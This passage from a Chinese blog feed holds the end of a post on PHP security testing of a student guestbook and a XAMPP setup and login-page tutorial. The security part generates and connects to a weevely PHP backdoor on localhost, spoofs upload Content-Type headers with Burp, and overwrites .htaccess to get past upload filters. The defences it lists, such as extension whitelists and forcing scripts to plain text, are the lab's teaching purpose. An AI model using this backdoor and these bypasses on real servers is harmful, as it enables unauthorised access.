class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'HTTP_REFERER'</span>]==<span class="string">"http://127.0.0.1/show.php"</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"referer校验通过"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/PHP开发-安全性分析-加固/csrf4.png" alt><br>不会影响正常admin删除留言</p><h1 id="4-文件上传漏洞"><a href="#4-文件上传漏洞" class="headerlink" title="4. 文件上传漏洞"></a>4. 文件上传漏洞</h1><p><code>/usr/bin/java -Xmx2g  -jar  burpsuite_free.jar</code></p><p>删除<code>localhost, 127.0.0.0/8, ::1</code></p><h2 id="4-1-攻击实现"><a href="#4-1-攻击实现" class="headerlink" title="4.1 攻击实现"></a>4.1 攻击实现</h2><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">生成PHP后门：weevely<span class="variable">.py</span> <span class="keyword">generate</span> [password] [back_door_path]</span><br><span class="line"></span><br><span class="line">&gt; weevely<span class="variable">.py</span> <span class="keyword">generate</span> a backdoor<span class="variable">.php</span> #生成一个密码为 a 的php木马 </span><br><span class="line">Generated backdoor <span class="keyword">with</span> password 'a' in <span class="number">'bac</span>kdoor<span class="variable">.php</span>' of <span class="number">1462</span> <span class="keyword">byte</span> size.</span><br></pre></td></tr></table></figure><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">连接<span class="selector-tag">PHP</span>后门：<span class="selector-tag">weevely</span><span class="selector-class">.py</span> <span class="selector-tag">URL</span> <span class="selector-attr">[password]</span> <span class="selector-attr">[cmd]</span>    #其中<span class="selector-tag">cmd</span>为可选</span><br><span class="line">#把生成好的马儿上传到目标服务器上哦!</span><br><span class="line"></span><br><span class="line">&gt; <span class="selector-tag">weevely</span><span class="selector-class">.py</span> <span class="selector-tag">http</span>:<span class="comment">//127.0.0.1/backdoor.php a</span></span><br><span class="line"><span class="selector-attr">[+]</span> <span class="selector-tag">weevely</span> <span class="selector-tag">3</span><span class="selector-class">.5</span></span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[+]</span> <span class="selector-tag">Target</span>:     <span class="selector-tag">127</span><span class="selector-class">.0</span><span class="selector-class">.0</span><span class="selector-class">.1</span></span><br><span class="line"><span class="selector-attr">[+]</span> <span class="selector-tag">Session</span>:    <span class="selector-tag">C</span>:\<span class="selector-tag">Users</span>\<span class="selector-tag">Evi1m4n</span>/<span class="selector-class">.weevely</span>/<span class="selector-tag">sessions</span>/<span class="selector-tag">127</span><span class="selector-class">.0</span><span class="selector-class">.0</span><span class="selector-class">.1</span>\<span class="selector-tag">backdoor_0</span><span class="selector-class">.session</span></span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[+]</span> <span class="selector-tag">Browse</span> <span class="selector-tag">the</span> <span class="selector-tag">filesystem</span> <span class="selector-tag">or</span> <span class="selector-tag">execute</span> <span class="selector-tag">commands</span> <span class="selector-tag">starts</span> <span class="selector-tag">the</span> <span class="selector-tag">connection</span></span><br><span class="line"><span class="selector-attr">[+]</span> <span class="selector-tag">to</span> <span class="selector-tag">the</span> <span class="selector-tag">target</span>. <span class="selector-tag">Type</span> <span class="selector-pseudo">:help</span> <span class="selector-tag">for</span> <span class="selector-tag">more</span> <span class="selector-tag">information</span>.</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">weevely</span>&gt;</span><br></pre></td></tr></table></figure><p>成功连接<br><img src="/2019/05/20/PHP开发-安全性分析-加固/upload.png" alt></p><h2 id="4-2-防御方法"><a href="#4-2-防御方法" class="headerlink" title="4.2 防御方法"></a>4.2 防御方法</h2><h3 id="4-2-1-前端上传绕过-客户端js检查"><a href="#4-2-1-前端上传绕过-客户端js检查" class="headerlink" title="4.2.1 前端上传绕过 客户端js检查"></a>4.2.1 前端上传绕过 客户端js检查</h3><p>JavaScript代码检查上传后缀 直接禁用即可绕过</p><h3 id="4-2-2-服务端白名单检测"><a href="#4-2-2-服务端白名单检测" class="headerlink" title="4.2.2 服务端白名单检测"></a>4.2.2 服务端白名单检测</h3><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$allowedExts = <span class="built_in">array</span>(<span class="string">"gif"</span>, <span class="string">"jpeg"</span>, <span class="string">"jpg"</span>, <span class="string">"png"</span>);</span><br></pre></td></tr></table></figure><h3 id="4-2-3-检查HTTP-Header中的Content-Type"><a href="#4-2-3-检查HTTP-Header中的Content-Type" class="headerlink" title="4.2.3 检查HTTP Header中的Content-Type"></a>4.2.3 检查HTTP Header中的Content-Type</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if ((($_FILES[<span class="string">"file"</span>][<span class="symbol">"type"</span>] == "image/gif")</span><br><span class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="symbol">"type"</span>] == "image/jpeg")</span><br><span class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="symbol">"type"</span>] == "image/jpg")</span><br><span class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="symbol">"type"</span>] == "image/pjpeg")</span><br><span class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="symbol">"type"</span>] == "image/x-png")</span><br><span class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="symbol">"type"</span>] == "image/png"))</span><br><span class="line">&amp;&amp; in_array($extension, $allowedExts))</span><br></pre></td></tr></table></figure><h3 id="4-2-4-Content-Type绕过方法"><a href="#4-2-4-Content-Type绕过方法" class="headerlink" title="4.2.4 Content-Type绕过方法"></a>4.2.4 Content-Type绕过方法</h3><p>使用各种各样的工具（如burpsuite）强行篡改Header就可以，将Content-Type: application/php改为其他web程序允许的类型</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; <span class="attribute">name</span>=<span class="string">"file"</span>; <span class="attribute">filename</span>=<span class="string">"upload_test.php"</span></span><br><span class="line">Content-Type: application/x-php</span><br></pre></td></tr></table></figure><p>改成</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; <span class="attribute">name</span>=<span class="string">"file"</span>; <span class="attribute">filename</span>=<span class="string">"upload_test.png"</span></span><br><span class="line">Content-Type: image/png</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/PHP开发-安全性分析-加固/upload2.png" alt></p><h3 id="4-2-4-上传文件夹设置"><a href="#4-2-4-上传文件夹设置" class="headerlink" title="4.2.4 上传文件夹设置"></a>4.2.4 上传文件夹设置</h3><p>给 upload文件夹设置 .htaccess文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">强制web服务器对于特定文件类型的处理 强制转换成文本</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> "\<span class="attr">.</span>(<span class="attr">php</span>|<span class="attr">pl</span>|<span class="attr">py</span>|<span class="attr">jsp</span>|<span class="attr">asp</span>|<span class="attr">htm</span>|<span class="attr">shtml</span>|<span class="attr">sh</span>|<span class="attr">cgi</span>)$"&gt;</span></span><br><span class="line">ForceType text/plain</span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br><span class="line"></span><br><span class="line">符合上面正则的全部被认为是纯文本，也可以继续往里面加入其他类型。</span><br><span class="line"></span><br><span class="line">只允许访问特定类型的文件 类似白名单</span><br><span class="line"><span class="tag">&lt;<span class="name">Files</span> ^(*<span class="attr">.jpeg</span>|*<span class="attr">.jpg</span>|*<span class="attr">.png</span>|*<span class="attr">.gif</span>)&gt;</span></span><br><span class="line">order deny,allow</span><br><span class="line">deny from all</span><br><span class="line"><span class="tag">&lt;/<span class="name">Files</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="4-2-5-绕过方法"><a href="#4-2-5-绕过方法" class="headerlink" title="4.2.5 绕过方法"></a>4.2.5 绕过方法</h3><p>把自己写的.htaccess 文件上传，覆盖掉服务器上的文件，来定义文件类型和执行权限如果做到了这一点</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;拿之前写的留言板demo来测试&lt;br&gt;sql注入&lt;br&gt;跨站脚本攻击实验(XSS)&lt;br&gt;跨站点请求伪造攻击(CSRF)&lt;br&gt;文件上传漏洞的分析与防护&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
    <category term="Web" scheme="http://Ronpa.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>PHP开发-环境搭建与动态网站设计</title>
    <link href="http://ronpa.top/2019/05/14/PHP%E5%BC%80%E5%8F%91-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%8A%A8%E6%80%81%E7%BD%91%E7%AB%99%E8%AE%BE%E8%AE%A1/"/>
    <id>http://ronpa.top/2019/05/14/PHP%E5%BC%80%E5%8F%91-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%8A%A8%E6%80%81%E7%BD%91%E7%AB%99%E8%AE%BE%E8%AE%A1/</id>
    <published>2019-05-14T07:35:48.000Z</published>
    <updated>2021-01-25T19:26:48.277Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>1 2班贼麻烦的操作系统安全和信息内容安全 4班还有啥数据挖掘什么的 <br>对比起来3班简直就是养老班 整一学期主修课就考一门你敢信 其他几门就交个报告<br>养老班也挺好 做自己别的东西 考雅思 GRE <br>最近刷到6.5了 终于说出去不太丢人了 加油啊 看到点 7 7 6.5 6.5的希望了</p></blockquote><a id="more"></a><p>完成一个基于PHP技术的动态网站，要求具备用户注册、登录、验证、数据交互与显示等功能</p><h1 id="1-PHP开发集成环境安装"><a href="#1-PHP开发集成环境安装" class="headerlink" title="1. PHP开发集成环境安装"></a>1. PHP开发集成环境安装</h1><h2 id="1-1-xampp安装"><a href="#1-1-xampp安装" class="headerlink" title="1.1 xampp安装"></a>1.1 xampp安装</h2><p>装在Ubuntu上</p><p>选择的是xampp-linux-x64-5.5.30-3-installer.zip，具体的版本可以从官网下载：<a href="https://www.apachefriends.org/zh_cn/index.html" target="_blank" rel="noopener">https://www.apachefriends.org/zh_cn/index.html</a></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod u+x xampp-linux-x64<span class="number">-5.5</span><span class="number">.30</span><span class="number">-3</span>-installer.run</span><br><span class="line">sudo ./xampp-linux-x64<span class="number">-5.5</span><span class="number">.30</span><span class="number">-3</span>-installer.run #执行安装</span><br><span class="line">/opt/lampp/lampp start #启动web服务器</span><br></pre></td></tr></table></figure><p><img src="/2019/05/14/PHP开发-环境搭建与动态网站设计/install.png" alt><br>在浏览器里访问 127.0.0.1<br><img src="/2019/05/14/PHP开发-环境搭建与动态网站设计/welcome.png" alt></p><p><code>sudo /opt/lampp/manager-linux-x64.run</code> 打开图形界面</p><h2 id="1-2-修改密码"><a href="#1-2-修改密码" class="headerlink" title="1.2 修改密码"></a>1.2 修改密码</h2><p>修改配置文件 找到/opt/lampp/etx/extra目录下的httpd-xampp.conf</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">opt<span class="regexp">/lampp/</span>lampp security</span><br></pre></td></tr></table></figure><ol><li>先输入xampp控制面板的密码（用户名是xampp）；</li><li>输入phpmyadmin的密码（用户名是pma）</li><li>输入mysql的密码（用户名是root）</li><li>输入ftp密码（用户名是daemon，默认端口21)</li></ol><p><img src="/2019/05/14/PHP开发-环境搭建与动态网站设计/security.png" alt></p><p>由于服务器设置了xampp不允许远程访问，所以远程不能访问需要修改conf文件<br><br><code>vi /opt/lampp/etc/extra/httpd-xampp.conf</code><br><br>将   Require local  改成  Require  all granted <br><br>/opt/lampp/lampp restart 重启xampp<br></p><h2 id="1-3-上传PHP文件"><a href="#1-3-上传PHP文件" class="headerlink" title="1.3 上传PHP文件"></a>1.3 上传PHP文件</h2><p>把PHP文件上传到opt/lampp/htdocs中 因为有权限限制 无法直接复制粘贴 使用 mv命令移动文件<br><code>sudo mv &#39;/home/masker/Desktop/hello.php&#39; .</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"Hello!"</span>; </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在浏览器里输入 127.0.0.1/hello.php即可访问<br><img src="/2019/05/14/PHP开发-环境搭建与动态网站设计/hello.png" alt></p><h1 id="2-动态网站搭建登录验证"><a href="#2-动态网站搭建登录验证" class="headerlink" title="2. 动态网站搭建登录验证"></a>2. 动态网站搭建登录验证</h1><blockquote><p>打算做一个简单的东西吧 用户注册、登录、验证、数据交互与显示等功能 就写一个最简单的留言板吧</p></blockquote><p>打算运用的是HTML+CSS进行编写页面<br><br>验证码封装了成了一个PHP类<br><br>当用户输入账号密码以及验证码后会 先验证验证码是否正确 当验证码正确的时候php访问数据库Myuser表与用户输入的账号密码进行匹对 匹对成功后跳转到网站主页</p><h2 id="2-1-设置数据库"><a href="#2-1-设置数据库" class="headerlink" title="2.1 设置数据库"></a>2.1 设置数据库</h2><p>在浏览器中输入<code>127.0.0.1/phpmyadmin/</code> 在出现的数据库管理界面进行操作,添加新表,设置字段.</p><h3 id="2-11-连接数据库"><a href="#2-11-连接数据库" class="headerlink" title="2.11 连接数据库"></a>2.11 连接数据库</h3><p>贼坑 Linux下和mac下不能用127.0.0.1连接数据库,只能有localhost</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$host=<span class="string">'localhost'</span>;</span><br><span class="line">$dbuser=<span class="string">'root'</span>;</span><br><span class="line">$pwd=<span class="string">'*******'</span>;</span><br><span class="line">$dbname=<span class="string">'test'</span>;</span><br><span class="line">$db = <span class="literal">new</span> mysqli($host,$dbuser,$pwd,$dbname);</span><br></pre></td></tr></table></figure><h2 id="2-2-登录界面"><a href="#2-2-登录界面" class="headerlink" title="2.2 登录界面"></a>2.2 登录界面</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">session_start();</span></span><br><span class="line"><span class="php">session_destroy();</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>留言板登录系统<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span></span><br><span class="line"><span class="css"><span class="selector-id">#login</span> <span class="selector-tag">p</span>&#123;</span></span><br><span class="line">margin-top: 15px;</span><br><span class="line">line-height: 20px;</span><br><span class="line">font-size: 14px;</span><br><span class="line">font-weight: bold;</span><br><span class="line">&#125;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span> <span class="attr">background</span>=<span class="string">"./images/7.jpg"</span> <span class="attr">style</span>=<span class="string">"background-size:cover;background-attachment: fixed;"</span> &gt;</span>  </span></span><br><span class="line"></span><br><span class="line">body &#123;</span><br><span class="line"><span class="css">    <span class="selector-tag">background-color</span>: <span class="selector-id">#ffffff</span>;</span></span><br><span class="line">    margin: 0;</span><br><span class="line">    padding: 0;</span><br><span class="line">    font: Arial, Helvetica, sans-serif;</span><br><span class="line"><span class="css">    <span class="selector-tag">text-align</span><span class="selector-pseudo">:center</span>;</span></span><br><span class="line">    text-align-last: center;</span><br><span class="line"><span class="css">    <span class="selector-tag">font-size</span><span class="selector-pseudo">:20px</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="css"><span class="selector-id">#login</span> <span class="selector-tag">img</span>&#123;</span></span><br><span class="line"><span class="css"><span class="selector-tag">cursor</span><span class="selector-pseudo">:pointer</span>;</span></span><br><span class="line">&#125;</span><br><span class="line">form&#123;</span><br><span class="line"><span class="css"><span class="selector-tag">margin-left</span><span class="selector-pseudo">:20px</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"./handle_login.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>留言板登录系统<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>用户名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"uid"</span> /&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="comment">&lt;!--uid=用户名--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"pwd"</span>/&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="comment">&lt;!--pwd=密码--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"log in"</span> /&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">onclick</span>=<span class="string">"window.location.href='register.php'"</span> <span class="attr">value</span>=<span class="string">"register"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="2-3-注册界面"><a href="#2-3-注册界面" class="headerlink" title="2.3 注册界面"></a>2.3 注册界面</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">session_start();</span></span><br><span class="line"><span class="php">session_destroy();</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>留言板登录系统<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span></span><br><span class="line"><span class="css"><span class="selector-id">#login</span> <span class="selector-tag">p</span>&#123;</span></span><br><span class="line">margin-top: 15px;</span><br><span class="line">line-height: 20px;</span><br><span class="line">font-size: 14px;</span><br><span class="line">font-weight: bold;</span><br><span class="line">&#125;</span><br><span class="line">body &#123;</span><br><span class="line"><span class="css">    <span class="selector-tag">background-color</span>: <span class="selector-id">#0d754c</span>;</span></span><br><span class="line">    margin: 0;</span><br><span class="line">    padding: 0;</span><br><span class="line">    font: Arial, Helvetica, sans-serif;</span><br><span class="line"><span class="css">    <span class="selector-tag">text-align</span><span class="selector-pseudo">:center</span>;</span></span><br><span class="line">    text-align-last: center;</span><br><span class="line"><span class="css">    <span class="selector-tag">font-size</span><span class="selector-pseudo">:20px</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="css"><span class="selector-id">#login</span> <span class="selector-tag">img</span>&#123;</span></span><br><span class="line"><span class="css"><span class="selector-tag">cursor</span><span class="selector-pseudo">:pointer</span>;</span></span><br><span class="line">&#125;</span><br><span class="line">form&#123;</span><br><span class="line"><span class="css"><span class="selector-tag">margin-left</span><span class="selector-pseudo">:20px</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>注册页面<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--form表单--&gt;</span><span class="comment">&lt;!--当前目录下"./handle.php"路径--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"./handle.php"</span> <span class="attr">method</span>=<span class="string">"post"</span>/&gt;</span><span class="comment">&lt;!--提交的方式隐藏的--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--用&lt;div&gt;做表单元素&lt;/div&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--文本框--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>用户名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"uid"</span> /&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="comment">&lt;!--uid=用户名--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>输入密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"pwd_1"</span> /&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="comment">&lt;!--pwd=密码--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>再次输入密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"pwd_2"</span> /&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="comment">&lt;!--pwd=密码--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--只要点击按钮submit提交        要显示的    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"注册"</span> /&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="2-4-注册处理"><a href="#2-4-注册处理" class="headerlink" title="2.4 注册处理"></a>2.4 注册处理</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">session_start();</span></span><br><span class="line"><span class="php">session_destroy();</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">background</span>=<span class="string">"./images/7.jpg"</span> <span class="attr">style</span>=<span class="string">"background-size:cover;background-attachment: fixed;"</span> &gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>留言板登录系统<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span></span><br><span class="line"><span class="css"><span class="selector-id">#login</span> <span class="selector-tag">p</span>&#123;</span></span><br><span class="line">margin-top: 15px;</span><br><span class="line">line-height: 20px;</span><br><span class="line">font-size: 14px;</span><br><span class="line">font-weight: bold;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">body &#123;</span><br><span class="line"><span class="css">    <span class="selector-tag">background-color</span>: <span class="selector-id">#ffffff</span>;</span></span><br><span class="line">    margin: 0;</span><br><span class="line">    padding: 0;</span><br><span class="line">    font: Arial, Helvetica, sans-serif;</span><br><span class="line"><span class="css">    <span class="selector-tag">text-align</span><span class="selector-pseudo">:center</span>;</span></span><br><span class="line">    text-align-last: center;</span><br><span class="line"><span class="css">    <span 